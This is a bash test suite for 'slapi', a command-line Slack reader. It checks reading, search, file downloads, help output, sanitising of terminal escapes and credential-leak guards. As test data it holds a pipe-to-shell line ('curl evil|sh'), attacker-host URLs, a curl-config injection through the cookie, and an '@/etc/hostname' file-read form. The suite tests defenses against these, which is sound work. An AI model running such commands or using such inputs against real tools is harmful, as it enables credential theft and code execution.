  fi
}
contains() { grep --quiet --fixed-strings -- "$2" <<<"$1"; }
lacks() { ! contains "$@"; }
equals() { [[ "$1" == "$2" ]]; }
starts() { [[ "$1" == "$2"* ]]; }
# nothing the sanitizer is meant to drop
clean() { printf '%s' "$1" | perl -CSD -0777 -ne 'exit(/[\x00-\x08\x0B-\x1F\x7F\x{80}-\x{9F}\x{AD}\x{34F}\x{61C}\x{115F}\x{1160}\x{17B4}\x{17B5}\x{180B}-\x{180E}\x{200B}\x{200E}\x{200F}\x{2028}-\x{202E}\x{2060}-\x{206F}\x{3164}\x{FEFF}\x{FFA0}\x{FFF0}-\x{FFFB}\x{E0000}-\x{E007F}\x{E0100}-\x{E01EF}]/ ? 1 : 0)'; }

run() {
  # last_call only looks at what happened after this mark, so a run that never reached
  # Slack cannot be mistaken for the previous run's request
  wc --lines <"$LOG" >"$W/runmark"
  HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' \
    SLAPI_XOXC=xoxc-fake-1 "$SLAPI" "$@"
}
# last logged API call for a method, as JSON
last_call() { jq --slurp --compact-output --arg m "$1" --argjson from "$(cat "$W/runmark" 2>/dev/null || echo 0)" '.[$from:] | map(select(.method == $m)) | last | .form' "$LOG"; }
count_calls() { jq --slurp --arg m "$1" 'map(select(.method == $m)) | length' "$LOG"; }
count_gets() { jq --slurp 'map(select(.get != null)) | length' "$LOG"; }
ts_local() { date --date "@$1" '+%Y-%m-%d %H:%M:%S'; }

echo "-- read"
out=$(run read general 2>"$ERR")
check "read: header" contains "$out" "Channel: #general (C0000001A)"
check "read: author from real name" contains "$out" "=== Message from Bob B (UAAAAAAA2) at $(ts_local 1790000300) +07 ==="
check "read: ts line" contains "$out" "Message TS: 1790000300.000100"
check "read: text markup resolved" contains "$out" "> quoted & @alice ping link (https://x.io) @here #random"
check "read: reactions with names" contains "$out" "Reactions: :thumbsup: x2 (alice, Bob B)"
check "read: thread info" contains "$out" "Thread: 2 replies, latest $(ts_local 1790000400) +07"
check "read: file listed" contains "$out" "  - F0000000001 shot one.png (image/png, 171 KB)"
check "read: download hint" contains "$out" "Files (slapi file <id> to download):"
check "read: attachment" contains "$out" "  - Fwd <https://y.io>"
check "read: nested attachment file" contains "$out" "    - file F0000000002 nested.pdf (application/pdf, 2 KB)"
check "read: bot author" contains "$out" "=== Message from deploybot (B1)"
check "read: newest first" [ "$(grep --line-number 'Bob B (UAAAAAAA2)' <<<"$out" | head --lines 1 | cut --delimiter : --fields 1)" -lt "$(grep --line-number 'deploybot' <<<"$out" | head --lines 1 | cut --delimiter : --fields 1)" ]
check "read: cursor hint on stderr" contains "$(cat "$ERR")" "More results: --cursor NEXT=="
check "read: stdout free of hint" lacks "$out" "More results"

out=$(run read general --asc)
check "read --asc: oldest first" starts "$(sed --quiet '3p' <<<"$out")" "=== Message from deploybot (B1)"

out=$(run read general --concise)
check "concise: file ids" contains "$out" "[files: F0000000001]"
check "concise: nested file ids" contains "$out" "[files: F0000000002]"
check "concise: thread marker" contains "$out" "[2 replies, ts 1790000300.000100]"
check "concise: no channel header" lacks "$out" "Channel:"

run read general --cursor 'abc==' --oldest 2026-09-20 --latest 1790000500 --limit 5 >/dev/null 2>&1
call=$(last_call conversations.history)
check "flags: cursor" equals "$(jq --raw-output .cursor <<<"$call")" "abc=="
check "flags: date to unix" equals "$(jq --raw-output .oldest <<<"$call")" "$(date --date 2026-09-20 +%s)"
check "flags: latest" equals "$(jq --raw-output .latest <<<"$call")" "1790000500"
check "flags: limit" equals "$(jq --raw-output .limit <<<"$call")" "5"
run read general >/dev/null 2>&1
check "flags: default limit" equals "$(jq --raw-output .limit <<<"$(last_call conversations.history)")" "100"

out=$(run read UAAAAAAA1)
check "read by user id: dm" contains "$out" "Channel: DM with alice (D0000003C)"
check "read by user id: body" contains "$out" "dm body"
out=$(run read @alice)
check "read by @name" contains "$out" "Channel: DM with alice (D0000003C)"
check "read by C id verbatim" contains "$(run read C0000001A)" "Channel: #general (C0000001A)"

out=$(run read '#rando' 2>"$ERR")
check "read unjoined: fuzzy match falls back to workspace channels" contains "$(cat "$ERR")" "trying all public channels"
check "read unjoined: resolved id" equals "$(jq --raw-output .channel <<<"$(last_call conversations.history)")" "C0000005E"
check "read unjoined: slack error surfaced" contains "$(cat "$ERR")" "conversations.history: channel_not_found"
run read nosuchchannelxyz >/dev/null 2>&1
check "read nothing matching: exit 1" equals "$?" "1"

out=$(run read hostile)
check "sanitize: no ESC byte in output" equals "$(printf '%s' "$out" | tr --complement --delete '\033' | wc --bytes)" "0"
check "sanitize: no CR in output" equals "$(printf '%s' "$out" | tr --complement --delete '\r' | wc --bytes)" "0"
check "sanitize: no BEL/BS/DEL in output" equals "$(printf '%s' "$out" | tr --complement --delete '\007\010\177' | wc --bytes)" "0"
check "sanitize: visible text survives" contains "$out" "red"
check "sanitize: file name survives minus escapes" contains "$out" "evil[2Jname.png"
out=$(run read hostile --concise)
check "sanitize: concise too" equals "$(printf '%s' "$out" | tr --complement --delete '\033\r' | wc --bytes)" "0"

###
echo "-- thread"
out=$(run thread general 1790000300.000100)
check "thread: heading" contains "$out" "Channel: #general (C0000001A) thread 1790000300.000100"
check "thread: parent" contains "$out" "parent"
check "thread: reply" contains "$out" "reply one"
check "thread: ts sent" equals "$(jq --raw-output .ts <<<"$(last_call conversations.replies)")" "1790000300.000100"
run thread general >/dev/null 2>&1
check "thread: needs ts" equals "$?" "1"

###
echo "-- search"
out=$(run search term --limit 3 2>"$ERR")
check "search: header" contains "$out" "# Search Results for: term"
check "search: count excludes bots" contains "$out" "## Messages (3 results)"
check "search: public hit" contains "$out" "public hit"
check "search: dm label" contains "$out" "Channel: DM with alice (ID: D0000003C)"
check "search: bot hidden" lacks "$out" "bot hit"
check "search: permalink" contains "$out" "Permalink: https://acme.slack.com/archives/C0000001A/p1"
check "search: page hint" contains "$(cat "$ERR")" "More results: --page 2"
run search term >/dev/null 2>&1
call=$(last_call search.messages)
check "search: default sort score" equals "$(jq --raw-output .sort <<<"$call")" "score"
check "search: default desc" equals "$(jq --raw-output .sort_dir <<<"$call")" "desc"
check "search: default count" equals "$(jq --raw-output .count <<<"$call")" "20"

out=$(run search term --public)
check "search --public: keeps public" contains "$out" "public hit"
check "search --public: drops private" lacks "$out" "private hit"
check "search --public: drops dm" lacks "$out" "dm hit"
out=$(run search term --types im)
check "search --types im: only dm" contains "$out" "dm hit"
check "search --types im: drops public" lacks "$out" "public hit"
out=$(run search term --types public_channel,private_channel)
check "search --types csv: private in" contains "$out" "private hit"
check "search --types csv: dm out" lacks "$out" "dm hit"
out=$(run search term --mine)
check "search --mine: keeps mine" contains "$out" "private hit"
out=$(run search term --bots)
check "search --bots: bot shown and flagged" contains "$out" "  [BOT]"
out=$(run search term --concise)
check "search concise: one line" contains "$out" "$(ts_local 1790000500 | cut --characters 1-16) #general alice: public hit  https://acme.slack.com/archives/C0000001A/p1"

run search term --after 2026-09-20 --before 2026-09-22 >/dev/null 2>&1
q=$(jq --raw-output .query <<<"$(last_call search.messages)")
check "search dates: after widened by a day" contains "$q" "after:2026-09-19"
check "search dates: before widened by a day" contains "$q" "before:2026-09-23"
run search deploy failed 'in:#general' >/dev/null 2>&1
check "search: words joined" equals "$(jq --raw-output .query <<<"$(last_call search.messages)")" "deploy failed in:#general"
run search term --sort timestamp --asc --page 3 --limit 3 >/dev/null 2>&1
call=$(last_call search.messages)
check "search: sort" equals "$(jq --raw-output .sort <<<"$call")" "timestamp"
check "search: asc" equals "$(jq --raw-output .sort_dir <<<"$call")" "asc"
check "search: page" equals "$(jq --raw-output .page <<<"$call")" "3"
check "search: limit" equals "$(jq --raw-output .count <<<"$call")" "3"

out=$(run search term --public --context 2 --limit 1)
check "search --context: rendered" contains "$out" "Context before:"
call=$(last_call conversations.history)
check "search --context: latest is match ts" equals "$(jq --raw-output .latest <<<"$call")" "1790000500.000100"
check "search --context: limit" equals "$(jq --raw-output .limit <<<"$call")" "2"

out=$(run search shot --files)
check "search --files: header" contains "$out" "## Files (1 results)"
check "search --files: download hint" contains "$out" "Download: slapi file F0000000001"
check "search --files: uses files method" equals "$(count_calls search.files)" "1"
run search >/dev/null 2>&1
check "search: needs query" equals "$?" "1"

###
echo "-- search-channels"
out=$(run search-channels announcements)
check "channels: match on purpose" contains "$out" "Name: #general"
check "channels: archived hidden" lacks "$out" "#old-project"
check "channels: creator resolved" contains "$out" "Creator: alice (UAAAAAAA1)"
check "channels: created" contains "$out" "Created: $(ts_local 1408675181) +07"
check "channels: permalink" contains "$out" "Permalink: https://acme.slack.com/archives/C0000001A"
check "channels: type" contains "$out" "Channel Type: public_channel"
out=$(run search-channels announcements --archived)
check "channels --archived" contains "$out" "#old-project"
check "channels --archived flags archived" contains "$out" "Is Archived: true"
out=$(run search-channels memes fun)
check "channels: AND across topic and purpose" contains "$out" "Name: #random"
out=$(run search-channels memes announcements)
check "channels: AND excludes" contains "$out" "(0 results)"
check "channels: private hidden by default" lacks "$(run search-channels hush)" "#secret"
check "channels --private" contains "$(run search-channels hush --private)" "Channel Type: private_channel"
out=$(run search-channels 'announcements for' --limit 1)
check "channels: quoted phrase" contains "$out" "Name: #general"
out=$(run search-channels announcements --archived --limit 1 2>"$ERR")
check "channels: limit" contains "$out" "(1 results)"
check "channels: page hint" contains "$(cat "$ERR")" "More results: --page 2"
out=$(run search-channels announcements --archived --limit 1 --page 2)
check "channels: page 2" contains "$out" "Name: #old-project"
check "channels concise" contains "$(run search-channels memes --concise)" "#random  C0000005E  memes"

###
echo "-- search-users"
out=$(run search-users engineer)
check "users: match on title" contains "$out" "Name: alice.a"
check "users: deleted excluded" lacks "$out" "dave.d"
check "users: fields" contains "$out" "Title: Platform Engineer"
check "users: profile permalink" contains "$out" "Permalink: [link](https://acme.slack.com/team/UAAAAAAA1)"
check "users: match on custom field" contains "$(run search-users infrastructure)" "alice.a"
check "users: exclusion" contains "$(run search-users engineer -platform)" "(0 results)"
check "users: AND" contains "$(run search-users designer carol)" "Name: carol.c"
check "users: email" contains "$(run search-users bob@acme.com)" "User ID: UAAAAAAA2"
check "users concise" contains "$(run search-users carol --concise)" "UAAAAAAA3  carol.c  Carol C  Designer  carol@acme.com"
run search-users >/dev/null 2>&1
check "users: needs terms" equals "$?" "1"

###
echo "-- profile"
out=$(run profile)
check "profile: self id" contains "$out" "User ID: UAAAAAAA9"
check "profile: org from workspace" contains "$out" "Organization Name: Acme"
check "profile: admin flag no" contains "$out" "Admin: No"
out=$(run profile @alice --locale)
check "profile: by handle" contains "$out" "User ID: UAAAAAAA1"
check "profile: admin flag yes" contains "$out" "Admin: Yes"
check "profile: status" contains "$out" "Status: :palm_tree: away"
check "profile: locale" contains "$out" "Locale: en-US"
check "profile: by real name" contains "$(run profile 'Bob B')" "User ID: UAAAAAAA2"
check "profile: by id" contains "$(run profile UAAAAAAA3)" "Username: carol.c"
check "profile concise" contains "$(run profile UAAAAAAA3 --concise)" "UAAAAAAA3  carol.c  Carol C  Designer  carol@acme.com  Asia/Bangkok"
run profile nobody >/dev/null 2>&1
check "profile: unknown user exits 1" equals "$?" "1"

###
echo "-- dms/channels/whoami"
check "whoami" equals "$(run whoami)" "dung @ Acme https://acme.slack.com/"
out=$(run channels)
check "channels list: has general" contains "$out" "general"
check "channels list: no dms" lacks "$out" "mpdm"
out=$(run dms)
check "dms list: user id column" contains "$out" "D0000003C  UAAAAAAA1"
check "dms list: group" contains "$out" "mpdm-alice--bob-1"

###
echo "-- files"
# 1. real guard: fake host is http, not *.slack.com, so no credential may leave
gets_before=$(count_gets)
run file F0000000001 --out "$DL" >/dev/null 2>&1
check "file: refuses non-slack host" equals "$?" "1"
check "file: no download request reached the server" equals "$(count_gets)" "$gets_before"

# 2. same flow with the host guard lifted so the fake stands in for files.slack.com
sourced() {
  # $0 must not be the script path, or its run-only-when-executed guard would fire
  HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_UNDER_TEST="$SLAPI" \
    SLAPI_XOXC=xoxc-fake-1 SLAPI_D_COOKIE='xoxd-fake%2Bcookie' bash -c '
    source "$SLAPI_UNDER_TEST"
    is_slack_file_url() { return 0; }
    umask 077
    mkdir --parents "$CACHE_ROOT"
    load_auth
    parse_flags "$@"
    "$FN"
  ' harness "${@:2}"
}
export FN
FN=show_files
out=$(sourced x F0000000001 --out "$DL" 2>"$ERR")
path="$DL/F0000000001-shot_one.png"
check "file: prints local path" equals "$out" "$path"
check "file: sanitised name" [ -f "$path" ]
check "file: content" equals "$(head --bytes 8 "$path" | od --address-radix n --format x1 | tr --delete ' \n')" "89504e470d0a1a0a"
check "file: sent bearer" equals "$(jq --slurp --raw-output 'map(select(.get != null)) | last | .auth' "$LOG")" "Bearer xoxc-fake-1"
check "file: sent cookie" equals "$(jq --slurp --raw-output 'map(select(.get != null)) | last | .cookie' "$LOG")" "d=xoxd-fake%2Bcookie"
check "file: file mode private" equals "$(stat --format %a "$path")" "600"
gets_after_first=$(count_gets)
sourced x F0000000001 --out "$DL" >/dev/null 2>&1
check "file: second run served from disk" equals "$(count_gets)" "$gets_after_first"
out=$(sourced x F0000000004 --out "$DL" 2>&1)
check "file: html sign-in page rejected" contains "$out" "got an HTML page instead of a file"
check "file: rejected download not left behind" [ ! -e "$DL/F0000000004-expired.png" ]
out=$(sourced x F0000000005 --out "$DL" 2>&1)
check "file: no download url" contains "$out" "has no download URL, open https://acme.slack.com/files/F5"
out=$(sourced x F0000000099 --out "$DL" 2>&1)
check "file: unknown id surfaces slack error" contains "$out" "files.info: file_not_found"
run file >/dev/null 2>&1
check "file: needs args" equals "$?" "1"

FN=show_canvas
out=$(sourced x F0000000003 2>&1)
check "canvas: heading" contains "$out" "# Runbook"
check "canvas: body" contains "$out" "Step one"
check "canvas: list" contains "$out" "- a"
check "canvas: temp removed" equals "$(find "$T/.cache/slapi" -name 'canvas.*' | wc --lines)" "0"
run canvas nope >/dev/null 2>&1
check "canvas: rejects non id" equals "$?" "1"

###
echo "-- api"
check "api: read call" contains "$(run api users.info user=UAAAAAAA1)" '"name": "alice.a"'
for m in chat.postMessage files.delete conversations.join reactions.add chat.getPermalink admin.users.remove usergroups.users.update conversations.mark; do
  run api "$m" a=b >/dev/null 2>&1
  check "api refuses $m" equals "$?" "1"
done
before=$(count_calls chat.postMessage)
check "api: write method never sent" equals "$before" "0"

###
echo "-- flags"
for args in "read general --limit abc" "read general --bogus" "read general --limit" "search x --sort weird" "search x --types foo" "search x --after notatime"; do
  # shellcheck disable=SC2086
  run $args >/dev/null 2>"$ERR"
  check "flags: '$args' fails" equals "$?" "1"
done
run read general --limit abc 2>&1 | grep --quiet "must be a positive number"
check "flags: message names the flag" [ "${PIPESTATUS[1]}" = 0 ]
out=$(run search -- -term 2>/dev/null)
check "flags: -- passes dash terms" equals "$(jq --raw-output .query <<<"$(last_call search.messages)")" "-term"
run search -term >/dev/null 2>&1
check "flags: single dash word is a query word" equals "$(jq --raw-output .query <<<"$(last_call search.messages)")" "-term"

###
echo "-- auth"
# history is never cached, so it reaches the server (whoami would be served from cache)
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-wrong' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" read C0000001A 2>&1)
check "auth: rejected session surfaces slack error" contains "$out" "conversations.history: not_authed"
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' "$SLAPI" read C0000001A 2>&1)
check "auth: token scanned from chrome localStorage" contains "$out" "Channel: #general (C0000001A)"

###
echo "-- cache"
check "cache: users fetched once (2 pages)" equals "$(count_calls users.list)" "2"
run refresh
check "refresh: cache emptied" equals "$(find "$T/.cache/slapi" -mindepth 2 -maxdepth 2 -type f -not -path "*/files/*" | wc --lines)" "0"
check "cache dir private" equals "$(stat --format %a "$T/.cache/slapi")" "700"


###
echo "-- big workspace"
# the id-to-name map must reach jq by file: one argv argument tops out at 128 KiB
out=$(run read general 2>&1)
check "big workspace: read succeeds" equals "$?" "0"
map_file=$(find "$T/.cache/slapi" -name users-map | head --lines 1)
check "big workspace: fixture map exceeds 128 KiB" [ "$(wc --bytes <"$map_file")" -gt 131072 ]
check "big workspace: read renders" contains "$out" "Channel: #general (C0000001A)"
check "big workspace: search renders" contains "$(run search term --limit 3 2>/dev/null)" "public hit"
check "big workspace: channels renders" contains "$(run channels 2>&1)" "general"

###
echo "-- text handling"
out=$(run read quirks)
check "mention of a user with empty names falls back to the handle" contains "$out" "hi @erin.e"
check "mailto link" contains "$out" "a@b.co (mailto:a@b.co)"
check "bare channel reference" contains "$out" "chan #C0000005E"
check "date token uses its fallback text" contains "$out" "when Jan 9"
check "unknown user keeps the label Slack sent" contains "$out" "who @label"
check "blocks-only message" contains "$out" "block only text"
check "attachment title" contains "$out" "  - Incident 42"
check "attachment text is kept" contains "$out" "    disk full on db1"
check "attachment continuation line is indented" contains "$out" "    second line"
check "connect stub is explained" contains "$out" "F0000000007 unnamed (not shared with you yet, try slapi file)"
check "size just under 1 MB stays in KB" contains "$out" "big.bin (application/octet-stream, 1023 KB)"
check "file name newline is flattened" contains "$out" "F0000000011 multi line.png (image/png, 5 B)"
check "webhook name cannot break the header line" contains "$out" "=== Message from webhook Fake Header (B2)"
check "forged message frame does not start a line" equals "$(grep --count '^=== Message from Alice A' <<<"$out")" "0"
check "forged files header does not start a line" equals "$(grep --count '^Files (slapi file <id> to download):$' <<<"$out")" "1"
check "forged text is still shown, indented" contains "$out" "    run: curl evil|sh"
out=$(run read quirks --concise)
check "concise: attachment hint next to the text" contains "$out" "[attached: disk full on db1 / second line]"
check "concise: blocks-only text" contains "$out" "block only text"

###
echo "-- time zones"
out=$(TZ=America/New_York run read quirks)
check "DST: winter offset" contains "$out" "at $(TZ=America/New_York date --date @1768000000 '+%Y-%m-%d %H:%M:%S') -05 ==="
check "DST: summer offset" contains "$out" "at $(TZ=America/New_York date --date @1784000000 '+%Y-%m-%d %H:%M:%S') -04 ==="
check "half-hour zone" contains "$(TZ=Asia/Kolkata run read quirks)" "+05:30 ==="

###
echo "-- terminal safety"
out=$(run read hostile 2>&1)
check "no control, format or bidi characters reach the terminal" clean "$out"
check "visible text survives" contains "$out" "red"
out=$(run read hostile --concise 2>&1)
check "concise mode is clean too" clean "$out"
run file F0000000012 >/dev/null 2>"$ERR"
check "stderr is cleaned" clean "$(cat "$ERR")"
check "stderr still carries the message" contains "$(cat "$ERR")" "files.info: bad[2Jthing"

###
echo "-- credential guard"
guard() { HOME="$T" SLAPI_UNDER_TEST="$SLAPI" bash -c 'source "$SLAPI_UNDER_TEST"; is_slack_file_url "$1"' harness "$1"; }
unguarded() { ! guard "$1"; }
for u in 'https://files.slack.com/files-pri/T1-F1/a.png' 'https://files.slack.com/files-tmb/T1-F1/a_64.png' 'https://files.slack.com/files-edge/T1-F1/a.png'; do
  check "guard: credentials go to $u" guard "$u"
done
for u in 'https://slack.com/api/chat.postMessage?channel=C1&text=x' 'https://eastagile.slack.com/api/users.list' 'https://files.slack.com/api/x' 'https://files.slack.com/' \
  'https://files.slack.com.evil.com/files-pri/x' 'https://files.slack.com@evil.com/files-pri/x' 'http://files.slack.com/files-pri/x' \
  'https://evil.com/files.slack.com/files-pri/x' 'https://xfiles.slack.com/files-pri/x'; do
  check "guard: no credentials to $u" unguarded "$u"
done
out=$(run file -- --version 2>&1)
check "a leading dash is a URL, not a curl option" lacks "$out" "Protocols:"
run file -- $'https://files.slack.com/files-pri/\x1b[31mx' >/dev/null 2>"$ERR"
check "control characters in a URL are refused" contains "$(cat "$ERR")" "control characters"
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE=$'xoxd-a\nurl = "http://evil.example/"' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" whoami 2>&1)
check "a d cookie that could break the curl config is refused" contains "$out" "no usable Slack d cookie"
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC='xoxc-a"b' "$SLAPI" whoami 2>&1)
check "a malformed xoxc token is refused" contains "$out" "malformed"
before=$(count_calls auth.test)
run api auth.test 'x@/etc/hostname' >/dev/null 2>&1
check "api refuses the name@file form" equals "$?" "1"
check "api sent nothing" equals "$(count_calls auth.test)" "$before"

###
echo "-- canvas and downloads"
FN=show_canvas
out=$(sourced x F0000000008 2>&1)
check "canvas: renders" contains "$out" "# Sandboxed"
check "canvas: an iframe inside it is not fetched" lacks "$out" "SECRET-MARKER"
check "canvas: the iframe target got no request" equals "$(jq --slurp 'map(select((.get // "") | startswith("/secret"))) | length' "$LOG")" "0"
mkdir --parents "$W/fakebin"
printf '#!/bin/sh\necho boom >&2\nexit 3\n' >"$W/fakebin/pandoc"
chmod +x "$W/fakebin/pandoc"
out=$(PATH="$W/fakebin:$PATH" sourced x F0000000003 2>&1)
rc=$?
check "canvas: a pandoc failure is a failure" [ "$rc" -ne 0 ]
check "canvas: a pandoc failure is named as one" contains "$out" "pandoc could not convert canvas F0000000003"
FN=show_files
out=$(sourced x F0000000006 --out "$DL" 2>&1)
check "an uploaded html file is not mistaken for a rejected session" equals "$out" "$DL/F0000000006-page.html"
check "uploaded html content" contains "$(cat "$DL/F0000000006-page.html")" "uploaded page"
check "no half-written download is left behind" equals "$(find "$DL" -type f -name '*.??????' | wc --lines)" "0"

###
echo "-- errors and exit codes"
run read badts >/dev/null 2>"$ERR"
check "a render failure is a non-zero exit" equals "$?" "1"
check "a render failure says so" contains "$(cat "$ERR")" "jq"
out=$(run search noname 2>&1)
check "search: a DM hit without a channel name renders" equals "$?" "0"
check "search: the DM is named from its user" contains "$out" "Channel: DM with alice"
out=$(run search sparse --public 2>"$ERR")
check "post-filter keeps pulling pages until a hit survives" contains "$out" "sparse public"
check "no more-results hint after the last page" lacks "$(cat "$ERR")" "More results"
check "all three pages were fetched" equals "$(jq --slurp 'map(select(.method == "search.messages" and .form.query == "sparse")) | length' "$LOG")" "3"
out=$(run read throttle 2>"$ERR")
check "a 429 is retried" contains "$out" "after the throttle"
check "the wait is announced" contains "$(cat "$ERR")" "rate limited on conversations.history, waiting 1s"
run read throttled >/dev/null 2>"$ERR"
check "a persistent 429 gives up" equals "$?" "1"
check "a persistent 429 says why" contains "$(cat "$ERR")" "ratelimited"
check "a persistent 429 was tried three times" equals "$(jq --slurp 'map(select(.method == "conversations.history" and .form.channel == "C0000016P")) | length' "$LOG")" "3"
run refresh
check "refresh exits 0 with a files dir present" equals "$?" "0"

check "search --context: a hit that cannot be read says so" contains "$(run search term --types private_channel --context 1 --limit 1 2>/dev/null)" "Context before: unavailable"
out=$(run search threadhit --context 2 --limit 1 2>&1)
call=$(last_call conversations.replies)
check "search --context: a hit in a thread reads the thread" equals "$(jq --raw-output .ts <<<"$call")" "1790000300.000100"
check "search --context: only what came before the hit" equals "$(jq --raw-output .latest <<<"$call")" "1790000400.000100"
check "search --context: the replies just before the hit are shown" contains "$out" "reply on page two"
check "search --context: not the oldest ones" lacks "$out" "parent"
check "search --context: it followed the cursor" equals "$(jq --slurp 'map(select(.method == "conversations.replies" and .form.cursor == "R2")) | length' "$LOG")" "1"
SECONDS=0
run read perf >/dev/null 2>&1
rc=$?
check "a pathological message renders in bounded time" [ "$SECONDS" -lt 10 ]
check "a pathological message still exits 0" equals "$rc" "0"

###
echo "-- picking conversations"
chan() { jq --raw-output .channel <<<"$(last_call conversations.history)"; }
run read hr >/dev/null 2>&1
check "a whole workspace name beats a fuzzy hit among yours" equals "$(chan)" "C0000011K"
run read '#alice' >/dev/null 2>&1
check "# narrows to channels" equals "$(chan)" "C0000013M"
run read '@alice' >/dev/null 2>&1
check "@ narrows to people" equals "$(chan)" "D0000003C"
run read alice >/dev/null 2>&1
check "a whole DM name beats a longer channel name" equals "$(chan)" "D0000003C"
run read gen >/dev/null 2>&1
check "fuzzy matching still works" equals "$(chan)" "C0000001A"
out=$(run read UAAAAAAAB 2>&1)
check "no open DM is said plainly" contains "$out" "no open DM with UAAAAAAAB"

###
echo "-- permalinks and limits"
tsof() { jq --raw-output .ts <<<"$(last_call conversations.replies)"; }
run thread 'https://acme.slack.com/archives/C0000001A/p1790000300000100' >/dev/null 2>&1
check "thread from a permalink" equals "$(tsof)" "1790000300.000100"
run thread 'https://acme.slack.com/archives/C0000001A/p1790000400000100?thread_ts=1790000100.000100&cid=C0000001A' >/dev/null 2>&1
check "thread from a reply permalink uses the parent" equals "$(tsof)" "1790000100.000100"
run thread general p1790000300000100 >/dev/null 2>&1
check "thread accepts the p-form ts" equals "$(tsof)" "1790000300.000100"
check "read from a permalink" contains "$(run read 'https://acme.slack.com/archives/C0000001A/p1790000300000100' 2>/dev/null)" "Channel: #general (C0000001A)"
for args in "read general --limit 0" "search x --page 0" "read general --limit 1000" "search x --limit 101" "read general --limit 18446744073709551617" "search x --context 18446744073709551616" "search x --page 1.5"; do
  # shellcheck disable=SC2086
  run $args >/dev/null 2>&1
  check "limits: '$args' is refused" equals "$?" "1"
done
run read general --oldest 20260920 >/dev/null 2>&1
check "YYYYMMDD is a date, not epoch seconds" equals "$(jq --raw-output .oldest <<<"$(last_call conversations.history)")" "$(date --date 20260920 +%s)"

###
echo "-- discoverability"
# help must never reach for Chrome or the network: shim the cookie tool and prove it never runs
mkdir --parents "$W/shim" "$W/nohome"
printf '#!/bin/sh\ntouch "%s/cookie-tool-ran"\nexit 1\n' "$W" >"$W/shim/chrome-cookies-linux"
chmod +x "$W/shim/chrome-cookies-linux"
bare() { HOME="$W/nohome" PATH="$W/shim:$PATH" env --unset SLAPI_XOXC --unset SLAPI_D_COOKIE --unset SLAPI_BASE_URL "$SLAPI" "$@"; }
cmds="whoami channels dms read thread search search-channels search-users profile canvas file threads watch api refresh"
top=$(bare help 2>&1)
check "top level: slapi help exits 0" equals "$(bare help >/dev/null 2>&1; echo $?)" "0"
check "top level: points at per-command help" contains "$top" "slapi help <command>"
for c in $cmds; do
  check "top level lists $c" contains "$top" "$c"
  h1=$(bare help "$c" 2>&1)
  check "help $c exits 0" equals "$(bare help "$c" >/dev/null 2>&1; echo $?)" "0"
  check "help $c opens with its own usage line" contains "$h1" "slapi $c"
  check "$c --help is the same as help $c" equals "$(bare "$c" --help 2>&1)" "$h1"
  check "$c -h is the same as help $c" equals "$(bare "$c" -h 2>&1)" "$h1"
done
for a in w ch dm r h t s sc su p c f files history; do
  check "alias $a has help" equals "$(bare "$a" --help >/dev/null 2>&1; echo $?)" "0"
done
check "an unknown command never reaches the cookie tool" equals "$(bare bogus >/dev/null 2>&1; echo $?)" "1"
check "help never ran the cookie tool" [ ! -e "$W/cookie-tool-ran" ]
all_help=$(for c in $cmds; do bare help "$c"; done)
for f in $(grep --only-matching --extended-regexp '^    --[a-z-]+\)' "$SLAPI" | grep --only-matching -- '--[a-z-]*' | sort --unique); do
  check "some command documents $f" contains "$all_help" "$f"
done
check "flags are scoped: search documents --context" contains "$(bare help search)" "--context"
check "flags are scoped: read does not document --files" lacks "$(bare help read)" "--files"
check "flags are scoped: file documents --out" contains "$(bare help file)" "--out DIR"
check "aliases resolve: sc" contains "$(bare help sc)" "slapi search-channels"
check "unknown command points at help" contains "$(bare bogus 2>&1)" "slapi help lists the commands"
check "help for an unknown command says so" contains "$(bare help bogus 2>&1)" "no help for 'bogus'"
check "unknown flag points at per-command help" contains "$(run read --nope 2>&1)" "slapi help <command> lists the flags"
check "no matching conversation says where to look" contains "$(run read nosuchchannelxyz 2>&1)" "slapi channels, slapi dms or slapi search-channels <words>, or slapi refresh"
check "a message with replies names the exact thread command" contains "$(run read general 2>/dev/null)" "(slapi thread C0000001A 1790000300.000100)"
check "a message with files names the download command" contains "$(run read general 2>/dev/null)" "Files (slapi file <id> to download):"

###
echo "-- endpoint guard, sanitizing, cleanup, timeouts, tokens"
# the credentials go wherever SLAPI_BASE_URL points
base_ok() {
  HOME="$T" SLAPI_UNDER_TEST="$SLAPI" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 \
    bash -c 'source "$SLAPI_UNDER_TEST"; BASE_URL="$1"; load_auth' harness "$1" >/dev/null 2>&1
}
base_bad() { ! base_ok "$1"; }
for u in 'https://slack.com/api' 'https://eastagile.slack.com/api' 'http://127.0.0.1:8080/api' 'http://localhost/api'; do
  check "base url: $u is accepted" base_ok "$u"
done
for u in 'https://evil.example/api' 'http://evil.example/api' 'http://slack.com/api' 'https://slack.com.evil.example/api' \
  'https://evil.example/slack.com/api' 'https://evilslack.com/api' 'http://127.0.0.1.evil.example/api' \
  'http://localhost@evil.example/api' 'https://slack.com/apix'; do
  check "base url: $u is refused" base_bad "$u"
done
out=$(HOME="$W/nohome" PATH="$W/shim:$PATH" SLAPI_BASE_URL='https://evil.example/api' "$SLAPI" whoami 2>&1)
check "a foreign base url is refused with an explanation" contains "$out" "SLAPI_BASE_URL must be"
check "a foreign base url never reaches the cookie tool" [ ! -e "$W/cookie-tool-ran" ]

out=$(run api conversations.history channel=C0000007G 2>&1)
check "api output is sanitized too" clean "$out"
check "api output keeps the visible text" contains "$out" "red"
out=$(run read hostile 2>&1)
check "a ZWJ emoji sequence survives" contains "$out" "$(printf '\xf0\x9f\x91\xa8\xe2\x80\x8d\xf0\x9f\x91\xa9\xe2\x80\x8d\xf0\x9f\x91\xa7')"
check "a ZWNJ inside a word survives" contains "$out" "$(printf '\xd9\x85\xdb\x8c\xe2\x80\x8c\xd8\xae\xd9\x88\xd8\xa7\xd9\x87\xd9\x85')"
